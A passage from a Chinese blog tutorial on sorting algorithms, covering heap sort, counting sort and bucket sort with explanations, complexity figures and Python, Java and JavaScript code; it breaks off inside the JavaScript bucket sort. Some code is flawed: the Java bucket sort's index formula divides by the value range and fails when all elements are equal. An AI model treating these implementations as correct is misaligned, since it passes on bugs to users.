算法描述</h4><ol><li><p>将初始待排序关键字序列(R1,R2….Rn)构建成大顶堆，此堆为初始的无序区；</p></li><li><p>将堆顶元素R[1]与最后一个元素R[n]交换，此时得到新的无序区(R1,R2,……Rn-1)和新的有序区(Rn),且满足R[1,2…n-1]&lt;&#x3D;R[n]；</p></li><li><p>由于交换后新的堆顶R[1]可能违反堆的性质，因此需要对当前无序区(R1,R2,……Rn-1)调整为新堆，</p></li></ol><p>然后再次将R[1]与无序区最后一个元素交换，得到新的无序区(R1,R2….Rn-2)和新的有序区(Rn-1,Rn)。</p><p>不断重复此过程直到有序区的元素个数为n-1，则整个排序过程完成。</p><h4 id="7-2-动图演示"><a href="#7-2-动图演示" class="headerlink" title="7.2 动图演示"></a>7.2 动图演示</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E5%A0%86%E6%8E%92%E5%BA%8F.gif" alt="堆排序" title="堆排序"></p><h4 id="7-3-算法分析"><a href="#7-3-算法分析" class="headerlink" title="7.3 算法分析"></a>7.3 算法分析</h4><ul><li><p>时间复杂度：O(nlogn)</p></li><li><p>空间复杂度：O(1)</p></li><li><p>非稳定排序</p></li><li><p>原地排序</p></li></ul><h4 id="7-4-代码实现"><a href="#7-4-代码实现" class="headerlink" title="7.4 代码实现"></a>7.4 代码实现</h4><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">heap_sort</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param data:list</span></span><br><span class="line"><span class="string">    :return:sorted data</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">adjustHeap</span>(<span class="params">i</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;调整使之成为最大堆&quot;&quot;&quot;</span></span><br><span class="line">        maxIndex = i</span><br><span class="line">        <span class="keyword">if</span> i * <span class="number">2</span> &lt; length <span class="keyword">and</span> data[i * <span class="number">2</span>] &gt; data[maxIndex]:</span><br><span class="line">            maxIndex = i * <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> i * <span class="number">2</span> + <span class="number">1</span> &lt; length <span class="keyword">and</span> data[i * <span class="number">2</span> + <span class="number">1</span>] &gt; data[maxIndex]:</span><br><span class="line">            maxIndex = i * <span class="number">2</span> + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxIndex != i:</span><br><span class="line">            data[maxIndex], data[i] = data[i], data[maxIndex]</span><br><span class="line">            adjustHeap(maxIndex)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">buildMaxHeap</span>():</span><br><span class="line">        <span class="string">&quot;&quot;&quot;建立最大堆&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 从最后一个非叶子节点开始向上构造最大堆</span></span><br><span class="line">        i = (length - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">            adjustHeap(i)</span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构建一个最大堆</span></span><br><span class="line">    buildMaxHeap()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 循环将堆首位（最大值）与末位交换，然后再重新调整最大堆</span></span><br><span class="line">    <span class="keyword">while</span> length &gt; <span class="number">0</span>:</span><br><span class="line">        data[<span class="number">0</span>], data[length - <span class="number">1</span>] = data[length - <span class="number">1</span>], data[<span class="number">0</span>]</span><br><span class="line">        length -= <span class="number">1</span></span><br><span class="line">        adjustHeap(<span class="number">0</span>)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 原始乱序</span></span><br><span class="line">    d0 = [<span class="number">2</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">44</span>]</span><br><span class="line">    d1 = heap_sort(d0)</span><br><span class="line">    <span class="built_in">print</span>(d1)</span><br><span class="line">    <span class="comment"># 正确排序</span></span><br><span class="line">    <span class="comment"># [2, 2, 2, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 7, 9, 12, 15, 44, 45, 54, 64]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Head</span> &#123;</span><br><span class="line">    <span class="comment">// 堆排序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] headSort(<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="comment">//构建大顶堆</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (n - <span class="number">2</span>) / <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            downAdjust(arr, i, n - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//进行堆排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">1</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            <span class="comment">// 把堆顶元素与最后一个元素交换</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">            arr[i] = arr[<span class="number">0</span>];</span><br><span class="line">            arr[<span class="number">0</span>] = temp;</span><br><span class="line">            <span class="comment">// 把打乱的堆进行调整，恢复堆的特性</span></span><br><span class="line">            downAdjust(arr, <span class="number">0</span>, i - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//下沉操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">downAdjust</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> parent, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">//临时保存要下沉的元素</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[parent];</span><br><span class="line">        <span class="comment">//定位左孩子节点的位置</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> <span class="number">2</span> * parent + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//开始下沉</span></span><br><span class="line">        <span class="keyword">while</span> (child &lt;= n) &#123;</span><br><span class="line">            <span class="comment">// 如果右孩子节点比左孩子大，则定位到右孩子</span></span><br><span class="line">            <span class="keyword">if</span>(child + <span class="number">1</span> &lt;= n &amp;&amp; arr[child] &lt; arr[child + <span class="number">1</span>])</span><br><span class="line">                child++;</span><br><span class="line">            <span class="comment">// 如果孩子节点小于或等于父节点，则下沉结束</span></span><br><span class="line">            <span class="keyword">if</span> (arr[child] &lt;= temp ) <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// 父节点进行下沉</span></span><br><span class="line">            arr[parent] = arr[child];</span><br><span class="line">            parent = child;</span><br><span class="line">            child = <span class="number">2</span> * parent + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[parent] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>JavaScript</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> len;   <span class="comment">// 因为声明的多个函数都需要数据长度，所以把len设置成为全局变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">buildMaxHeap</span>(<span class="params">arr</span>) &#123;  <span class="comment">// 建立大顶堆</span></span><br><span class="line">    len = arr.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="title class_">Math</span>.<span class="title function_">floor</span>(len / <span class="number">2</span>); i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="title function_">heapify</span>(arr, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">heapify</span>(<span class="params">arr, i</span>) &#123;    <span class="comment">// 堆调整</span></span><br><span class="line">    <span class="keyword">var</span> left = <span class="number">2</span> * i + <span class="number">1</span>,</span><br><span class="line">        right = <span class="number">2</span> * i + <span class="number">2</span>,</span><br><span class="line">        largest = i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123;</span><br><span class="line">        largest = left;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123;</span><br><span class="line">        largest = right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (largest != i) &#123;</span><br><span class="line">        <span class="title function_">swap</span>(arr, i, largest);</span><br><span class="line">        <span class="title function_">heapify</span>(arr, largest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">arr, i, j</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> temp = arr[i];</span><br><span class="line">    arr[i] = arr[j];</span><br><span class="line">    arr[j] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">heapSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">    <span class="title function_">buildMaxHeap</span>(arr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = arr.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="title function_">swap</span>(arr, <span class="number">0</span>, i);</span><br><span class="line">        len--;</span><br><span class="line">        <span class="title function_">heapify</span>(arr, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8、计数排序（Counting-Sort）"><a href="#8、计数排序（Counting-Sort）" class="headerlink" title="8、计数排序（Counting Sort）"></a>8、计数排序（Counting Sort）</h3><p>计数排序不是基于比较的排序算法，其核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。<br>作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p><h4 id="8-1-算法描述"><a href="#8-1-算法描述" class="headerlink" title="8.1 算法描述"></a>8.1 算法描述</h4><ol><li><p>找出待排序的数组中最大和最小的元素；</p></li><li><p>统计数组中每个值为i的元素出现的次数，存入数组C的第i项；</p></li><li><p>对所有的计数累加（从C中的第一个元素开始，每一项和前一项相加）；</p></li><li><p>反向填充目标数组：将每个元素i放在新数组的第C(i)项，每放一个元素就将C(i)减去1。</p></li></ol><h4 id="8-2-动图演示"><a href="#8-2-动图演示" class="headerlink" title="8.2 动图演示"></a>8.2 动图演示</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E8%AE%A1%E6%95%B0%E6%8E%92%E5%BA%8F.gif" alt="计数排序" title="计数排序"></p><h4 id="8-3-算法分析"><a href="#8-3-算法分析" class="headerlink" title="8.3 算法分析"></a>8.3 算法分析</h4><p>计数排序是一个稳定的排序算法。当输入的元素是n个0到k之间的整数时，时间复杂度是O(n+k)，空间复杂度也是O(n+k)，<br>其排序速度快于任何比较排序算法。当k不是很大并且序列比较集中时，计数排序是一个很有效的排序算法。</p><ul><li><p>时间复杂度：O(n+k)</p></li><li><p>空间复杂度：O(k)</p></li><li><p>稳定排序</p></li><li><p>非原地排序</p></li></ul><p>注：K表示临时数组的大小</p><h4 id="8-4-代码实现"><a href="#8-4-代码实现" class="headerlink" title="8.4 代码实现"></a>8.4 代码实现</h4><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">count_sort</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;计数排序&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 找到最大最小值</span></span><br><span class="line">    min_num = <span class="built_in">min</span>(data)</span><br><span class="line">    max_num = <span class="built_in">max</span>(data)</span><br><span class="line">    <span class="comment"># 计数列表</span></span><br><span class="line">    count_list = [<span class="number">0</span>] * (max_num - min_num + <span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 计数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        count_list[i - min_num] += <span class="number">1</span></span><br><span class="line">    data.clear()</span><br><span class="line">    <span class="comment"># 填回</span></span><br><span class="line">    <span class="keyword">for</span> ind, i <span class="keyword">in</span> <span class="built_in">enumerate</span>(count_list):</span><br><span class="line">        <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">            data.append(ind + min_num)</span><br><span class="line">            i -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 原始乱序</span></span><br><span class="line">    d0 = [<span class="number">2</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">44</span>]</span><br><span class="line">    d1 = count_sort(d0)</span><br><span class="line">    <span class="built_in">print</span>(d1)</span><br><span class="line">    <span class="comment"># 正确排序</span></span><br><span class="line">    <span class="comment"># [2, 2, 2, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 7, 9, 12, 15, 44, 45, 54, 64]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Counting</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] countSort(<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr == <span class="literal">null</span> || arr.length &lt; <span class="number">2</span>) <span class="keyword">return</span> arr;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// 寻找数组的最大值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(max &lt; arr[i])</span><br><span class="line">                max = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//创建大小为max的临时数组</span></span><br><span class="line">        <span class="type">int</span>[] temp = <span class="keyword">new</span> <span class="title class_">int</span>[max + <span class="number">1</span>];</span><br><span class="line">        <span class="comment">//统计元素i出现的次数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            temp[arr[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//把临时数组统计好的数据汇总到原数组</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= max; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> temp[i]; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">                arr[k++] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>JavaScript</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">countingSort</span>(<span class="params">arr, maxValue</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> bucket = <span class="keyword">new</span> <span class="title class_">Array</span>(maxValue + <span class="number">1</span>),</span><br><span class="line">        sortedIndex = <span class="number">0</span>;</span><br><span class="line">    arrLen = arr.<span class="property">length</span>,</span><br><span class="line">        bucketLen = maxValue + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrLen; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!bucket[arr[i]]) &#123;</span><br><span class="line">            bucket[arr[i]] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bucket[arr[i]]++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; bucketLen; j++) &#123;</span><br><span class="line">        <span class="keyword">while</span> (bucket[j] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            arr[sortedIndex++] = j;</span><br><span class="line">            bucket[j]--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9、桶排序（Bucket-Sort）"><a href="#9、桶排序（Bucket-Sort）" class="headerlink" title="9、桶排序（Bucket Sort）"></a>9、桶排序（Bucket Sort）</h3><p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。</p><p>桶排序(Bucket sort)的工作的原理：假设输入数据服从均匀分布，将数据分到有限数量的桶里，</p><p>每个桶再分别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排）。</p><h4 id="9-1-算法描述"><a href="#9-1-算法描述" class="headerlink" title="9.1 算法描述"></a>9.1 算法描述</h4><ol><li><p>设置一个定量的数组当作空桶；</p></li><li><p>遍历输入数据，并且把数据一个一个放到对应的桶里去；</p></li><li><p>对每个不是空的桶进行排序；</p></li><li><p>从不是空的桶里把排好序的数据拼接起来。</p></li></ol><h4 id="9-2-图片演示"><a href="#9-2-图片演示" class="headerlink" title="9.2 图片演示"></a>9.2 图片演示</h4><p><img src="/posts/827ca9cd/%E5%8D%81%E5%A4%A7%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95_%E6%A1%B6%E6%8E%92%E5%BA%8F.jpg" alt="桶排序" title="桶排序"></p><h4 id="9-3-算法分析"><a href="#9-3-算法分析" class="headerlink" title="9.3 算法分析"></a>9.3 算法分析</h4><p>桶排序最好情况下使用线性时间O(n)，桶排序的时间复杂度，取决与对各个桶之间数据进行排序的时间复杂度，<br>因为其它部分的时间复杂度都为O(n)。很显然，桶划分的越小，各个桶之间的数据越少，排序所用的时间也会越少。但相应的空间消耗就会增大。</p><ul><li><p>时间复杂度：O(n+k)</p></li><li><p>空间复杂度：O(n+k)</p></li><li><p>稳定排序</p></li><li><p>非原地排序</p></li></ul><p>注：K表示临时数组的大小</p><h4 id="9-4-代码实现"><a href="#9-4-代码实现" class="headerlink" title="9.4 代码实现"></a>9.4 代码实现</h4><ul><li>Python</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bucket_sort</span>(<span class="params">data, num=<span class="number">10</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param data:list</span></span><br><span class="line"><span class="string">    :param num:bucket num</span></span><br><span class="line"><span class="string">    :return:sorted data</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">if</span> length &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    min_value = <span class="built_in">min</span>(data)</span><br><span class="line">    max_value = <span class="built_in">max</span>(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">    pattern = <span class="string">r&quot;^[1-9]+[0-9]*$&quot;</span></span><br><span class="line">    <span class="comment"># 桶的数量，如果不匹配默认取10</span></span><br><span class="line">    num = num <span class="keyword">if</span> num &gt; <span class="number">1</span> <span class="keyword">and</span> re.<span class="keyword">match</span>(pattern, <span class="built_in">str</span>(num)) <span class="keyword">else</span> <span class="number">10</span></span><br><span class="line">    <span class="comment"># 桶的空间</span></span><br><span class="line">    space = <span class="built_in">int</span>((max_value - min_value) / num) + <span class="number">1</span></span><br><span class="line">    <span class="comment"># 初始化桶空间,注意:[[]] * num生成list的坑,两者append方法结果不同</span></span><br><span class="line">    buckets = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将数据放到对应的桶里面,难点:数据与桶的映射关系</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        <span class="comment"># 数据与桶的映射关系</span></span><br><span class="line">        index = <span class="built_in">int</span>((data[i] - min_value) / space)</span><br><span class="line">        <span class="comment"># print(data[i], index)</span></span><br><span class="line">        buckets[index].append(data[i])</span><br><span class="line">        <span class="comment"># print(buckets)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 桶内数据排序</span></span><br><span class="line">    <span class="comment"># for n in buckets:</span></span><br><span class="line">    <span class="comment">#     print(n)</span></span><br><span class="line">    <span class="comment">#     n.sort()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按序取出桶内的数据，组成有序序列</span></span><br><span class="line">    sorted_data = []</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> buckets:</span><br><span class="line">        n.sort()</span><br><span class="line">        sorted_data += n</span><br><span class="line">    <span class="keyword">return</span> sorted_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 原始乱序</span></span><br><span class="line">    d0 = [<span class="number">2</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">64</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">44</span>]</span><br><span class="line">    d1 = bucket_sort(d0)</span><br><span class="line">    <span class="built_in">print</span>(d1)</span><br><span class="line">    <span class="comment"># 正确排序</span></span><br><span class="line">    <span class="comment"># [2, 2, 2, 3, 4, 4, 4, 4, 5, 5, 5, 6, 6, 7, 9, 12, 15, 44, 45, 54, 64]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Java</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BucketSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] BucketSort(<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr == <span class="literal">null</span> || arr.length &lt; <span class="number">2</span>) <span class="keyword">return</span> arr;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> arr.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// 寻找数组的最大值与最小值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(min &gt; arr[i])</span><br><span class="line">                min = arr[i];</span><br><span class="line">            <span class="keyword">if</span>(max &lt; arr[i])</span><br><span class="line">                max = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//和优化版本的计数排序一样，弄一个大小为 min 的偏移值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> max - min;</span><br><span class="line">        <span class="comment">//创建 d / 5 + 1 个桶，第 i 桶存放  5*i ~ 5*i+5-1范围的数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">bucketNum</span> <span class="operator">=</span> d / <span class="number">5</span> + <span class="number">1</span>;</span><br><span class="line">        ArrayList&lt;LinkedList&lt;Integer&gt;&gt; bucketList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(bucketNum);</span><br><span class="line">        <span class="comment">//初始化桶</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketNum; i++) &#123;</span><br><span class="line">            bucketList.add(<span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;Integer&gt;());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//遍历原数组，将每个元素放入桶中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            bucketList.get((arr[i]-min)/d).add(arr[i] - min);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对桶内的元素进行排序，我这里采用系统自带的排序工具</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketNum; i++) &#123;</span><br><span class="line">            Collections.sort(bucketList.get(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把每个桶排序好的数据进行合并汇总放回原数组</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bucketNum; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Integer t : bucketList.get(i)) &#123;</span><br><span class="line">                arr[k++] = t + min;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>JavaScript</li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">bucketSort</span>(<span class="params">arr, bucketSize</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> i;</span><br><span class="line">    <span class="keyword">var</span> minValue = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> maxValue = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &lt; minValue) &#123;</span><br><span class="line">            minValue = arr[i];               <span class="comment">// 输入数据的最小值</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[i] &gt; maxValue) &#123;</span><br><span class="line">            maxValue = arr[i];               <span class="comment">// 输入数据的最大值</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 桶的初始化</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">DEFAULT_BUCKET_SIZE</span> = <span class="number">5</span>;           <span class="comment">// 